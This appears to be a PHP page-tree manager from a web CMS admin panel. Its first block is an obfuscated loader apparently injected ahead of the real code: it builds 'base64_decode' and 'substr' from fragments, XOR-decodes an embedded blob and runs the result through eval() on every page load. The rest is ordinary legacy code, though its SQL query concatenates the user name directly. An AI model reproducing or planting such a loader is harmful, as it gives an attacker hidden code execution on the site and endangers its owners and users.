<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>
<?php
	$arrPages = array();
	
	mysql_connect("$DBHost", "$DBUser", "$DBPass");
	mysql_select_db($DBName);

	$oRows=mysql_query("select * from $DBprefix"."pages"." WHERE user='".($AuthUserName=="administrator"?"admin":$AuthUserName)."' order by parent_id,id");
	
	$scriptPageIds="var pageIds=Array(''";
	$scriptRealPageIds="var pageRealIds=Array(''";
	$scriptParentIds="var parentIds=Array(''";
	$scriptExtensions="var pagesExtensions=Array(''";
	

					
					
	while ($row = mysql_fetch_array($oRows))
	{
		
		$strRowActive = "";
		$strRowExtension = "";
		$strRowDefault = "";
		
		if($row["active_".$lang] == 0)
		{
			$strRowActive = "[$NOT_ACTIVE]"; 
		}
		
		if($row["id"] == $strDefaultPageId)
		{
			$strRowDefault = "[$DEFAULT]";
		}
		
		if(substr($row["html_".$lang],0,13)=="wsa:extension")
		{
			$modInfo=explode(":",$row["html_".$lang]);
			$strRowExtension = "<sup><font color=red>".$modInfo[2].".php</font></sup>";
		}
		
		
		
		array_push($arrPages, array($row['id'], $row['parent_id'], $row["link_".$lang],$strRowDefault,$strRowActive,$strRowExtension));
	
		$scriptRealPageIds.=",'".$row['id']."'";

		if(substr($row["html_".$lang],0,13)=="wsa:extension")
		{
			$modInfo=explode(":",$row["html_".$lang]);
			$scriptExtensions .=",'".$modInfo[2]."'";
		}
		else
		{
			$scriptExtensions .=",''";
		}


			$scriptPageIds.=",'".$row['id']."'";
			$scriptParentIds.=",'".$row['parent_id']."'";
	}
	
	mysql_close();

	$scriptExtensions.=");\n";
	$scriptPageIds.=");\n";
	$scriptParentIds.=");\n";
	$scriptRealPageIds.=");\n";


	echo "<script>
			$scriptRealPageIds
			$scriptExtensions
			$scriptPageIds
			$scriptParentIds
			</script>";
?>



<?php
function GetKinds($parent)
{

global $arrPages;
$arrParents = array();

for($j = (sizeof($arrPages)-1);$j>=0;$j--)
{
	if($arrPages[$j][0] == $parent)	
	{
		$parent = $arrPages[$j][1];

		array_push($arrParents, $parent);
	}
}

$arrKinds = array();

$iParentsCounter = 0;
$currentParent = -1;

for($j = (sizeof($arrPages)-1);$j>=0;$j--)
{
	if($arrParents[$iParentsCounter] == $arrPages[$j][0])
	{
		if($currentParent == $arrPages[$j][1])
		{
			array_push($arrKinds, "2");
		}
		else
		{
			array_push($arrKinds, "1");
		}
		
		$iParentsCounter++;
	}

	$currentParent = $arrPages[$j][1];
}

$arrKinds = array_reverse($arrKinds);

return $arrKinds;
}



function GetSubArray($parent)
{

	global $arrPages;

	$arrResult = array();

	for($i=0;$i<sizeof($arrPages);$i++)
	{
		if($arrPages[$i][1] == $parent)
		{
			array_push($arrResult, $arrPages[$i]);
		}
	}

	return $arrResult;

}

function GeneratePrefix($x,$parent)
{
	$strResult = "";

	$arrKinds = GetKinds($parent);

	for($i=0;$i<$x;$i++)
	{
		//$strResult .= "*";

		if($i == ($x-1))
		{
			$strResult .= "<img src=\"images/g.gif\" width=60 height=40>";
		}
		else
		{
			$strResult .= "<img src=\"images/g_blank".$arrKinds[$i].".gif\" width=60 height=40>";
		}
	}

	return $strResult;
}

$levelCounter = 0;


function GetPageArray($parent)
{
	global $arrPages;
	$arrResult = array();
	
	foreach($arrPages as $arrPage)
	{
		if($arrPage[0] == $parent)
		{
			$arrResult = $arrPage;
			break;
		}
	}
	
	return $arrResult;
}

function IsLastInGroup($pageId, $parent)
{
		global $arrPages;
	
		$bResult = false;
	
		
		foreach($arrPages as $arrPage)
		{
		
			if($arrPage[1] == $parent)
			{
			
			 	if($arrPage[0] == $pageId)
				{
					$bResult = true;		
				}
				else
				{
					$bResult = false;		
				}
			
			}
			
						
		}
		
				
		return $bResult;
}


function IsFirstInGroup($pageId, $parent)
{
		global $arrPages;
	
		$bResult = false;
	
		
		foreach($arrPages as $arrPage)
		{
			if($arrPage[1] == $parent)
			{
			
							if($arrPage[0] == $pageId)
							{
								$bResult = true;		
							}	
							
					break;
			}
					
		}
		
		return $bResult;
}


function WriteLevel($parent, $iLevel)
{

	global $arrPages;

	if(sizeof(GetSubArray($parent)) == 0)
	{
		$arrCurrentPageArray = GetPageArray($parent);
		
		if(isset($arrCurrentPageArray) && sizeof($arrCurrentPageArray))
		{
			echo "<table  cellpadding=0 cellspacing=0><tr><td >".GeneratePrefix($iLevel,$parent)."</td><td valign=bottom><table bgcolor=#efebef width=250  height=25 cellpadding=0 cellspacing=0 style='border-style:solid;border-color:#CECFCE;border-width:1px 1px 1px 1px;color:#666F74;'><tr><td background='images/pro_bg.jpg'  onmousedown=\"javascript:PageClicked(".$parent.",this)\"> &nbsp;<b>".$arrCurrentPageArray[2]."</b>&nbsp;&nbsp;".$arrCurrentPageArray[3]."&nbsp;".$arrCurrentPageArray[4]."&nbsp;".$arrCurrentPageArray[5]." </td></tr></table></td>";
			
			
			if
			(
				IsFirstInGroup($arrCurrentPageArray[0], $arrCurrentPageArray[1])
				&&
				IsLastInGroup($arrCurrentPageArray[0], $arrCurrentPageArray[1])
			)
			{
				echo "
					<td valign=bottom width=40 align=right>&nbsp;</td>
					<td valign=bottom align=center>&nbsp;</td>
				";
			}
			else
			if(IsFirstInGroup($arrCurrentPageArray[0], $arrCurrentPageArray[1]))
			{
				echo "
					<td valign=bottom width=40 align=right><a href='javascript:MoveDown(".$arrCurrentPageArray[0].")'><img src='images/arrow_down.gif' width=25 height=21 alt='' border=0></a></td>
					<td valign=bottom align=center>&nbsp;</td>
				";
			}
			else
			if(IsLastInGroup($arrCurrentPageArray[0], $arrCurrentPageArray[1]))
			{
				echo "
					<td valign=bottom width=40 align=right><a href='javascript:MoveUp(".$arrCurrentPageArray[0].")'><img src='images/arrow_up.gif' width=25 height=21 alt='' border=0></a></td>
					<td valign=bottom  align=center>&nbsp;</td>
				";
			}
			else
			{
			
				echo "
					<td valign=bottom width=40 align=right><a href='javascript:MoveUp(".$arrCurrentPageArray[0].")'><img src='images/arrow_up.gif' width=25 height=21 alt='' border=0></a></td>
					<td valign=bottom width=25><a href='javascript:MoveDown(".$arrCurrentPageArray[0].")'><img src='images/arrow_down.gif' width=25 height=21 alt='' border=0></a></td>
				";
			}
			
			echo "</tr></table>";
		}
	}
	else
	{
		if($parent != 0)
		{
		
			$arrCurrentPageArray = GetPageArray($parent);
			
			echo "<table  cellpadding=0 cellspacing=0><tr><td>".GeneratePrefix($iLevel,$parent)."</td><td valign=bottom><table bgcolor=#efebef width=250 height=25 cellpadding=0 cellspacing=0 style='border-style:solid;border-color:#CECFCE;border-width:1px 1px 1px 1px;color:#666F74;'><tr><td background='images/pro_bg.jpg'  onmousedown=\"javascript:PageClicked(".$parent.",this)\" > &nbsp;<b>".$arrCurrentPageArray[2]."</b>&nbsp;&nbsp;".$arrCurrentPageArray[3]."&nbsp;".$arrCurrentPageArray[4]."&nbsp;".$arrCurrentPageArray[5]." </td></tr></table></td>";
			
			
			if
			(
				IsFirstInGroup($arrCurrentPageArray[0], $arrCurrentPageArray[1])
				&&
				IsLastInGroup($arrCurrentPageArray[0], $arrCurrentPageArray[1])
			)
			{
				echo "
					<td valign=bottom width=40 align=right>&nbsp;</td>
					<td valign=bottom align=center>&nbsp;</td>
				";
			}
			else
			if(IsFirstInGroup($arrCurrentPageArray[0], $arrCurrentPageArray[1]))
			{
				echo "
					<td valign=bottom width=40 align=right><a href='javascript:MoveDown(".$arrCurrentPageArray[0].")'><img src='images/arrow_down.gif' width=25 height=21 alt='' border=0></a></td>
					<td valign=bottom align=center>&nbsp;</td>
				";
			}
			else
			if(IsLastInGroup($arrCurrentPageArray[0], $arrCurrentPageArray[1]))
			{
				echo "
					<td valign=bottom width=40 align=right><a href='javascript:MoveUp(".$arrCurrentPageArray[0].")'><img src='images/arrow_up.gif' width=25 height=21 alt='' border=0></a></td>
					<td valign=bottom  align=center>&nbsp;</td>
				";
			}
			else
			{
			
				echo "
					<td valign=bottom width=40 align=right><a href='javascript:MoveUp(".$arrCurrentPageArray[0].")'><img src='images/arrow_up.gif' width=25 height=21 alt='' border=0></a></td>
					<td valign=bottom width=25><a href='javascript:MoveDown(".$arrCurrentPageArray[0].")'><img src='images/arrow_down.gif' width=25 height=21 alt='' border=0></a></td>
				";
			}
			
			echo "</tr></table>";
		}
		//<td width=24><img src=images/settings_small.gif width=22 height=23></td>

		++$iLevel;
		foreach(GetSubArray($parent) as $levelArray)
		{
			WriteLevel($levelArray[0], $iLevel);
		}
	}
}

?>


